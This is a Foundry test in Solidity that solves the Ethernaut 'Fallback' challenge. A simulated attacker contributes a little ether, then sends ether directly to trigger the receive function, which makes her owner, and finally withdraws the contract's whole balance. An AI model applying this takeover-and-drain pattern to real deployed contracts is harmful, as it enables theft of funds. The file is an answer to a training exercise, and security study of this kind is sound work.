// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "src/openzeppelin-ethernaut/Fallback.sol";

// contribute() then send ether directly
contract FallbackTest is Test {
    Fallback public instance;

    function setUp() public {
        instance = new Fallback();
    }

    function test() public {
        assertEq(instance.owner(), address(this));
        assertEq(address(instance).balance, 0);

        address alice = makeAddr("alice");
        uint256 initBalance = 1 ether;
        vm.deal(alice, initBalance);
        vm.startPrank(alice);

        uint256 sent = 0.0001 ether;
        instance.contribute{value: sent}();
        address(instance).call{value: sent}("");
        assertEq(instance.owner(), alice);
        assertEq(address(instance).balance, sent * 2);
        assertEq(alice.balance, initBalance - sent * 2);

        instance.withdraw();
        assertEq(alice.balance, initBalance);
        assertEq(address(instance).balance, 0);
    }
}
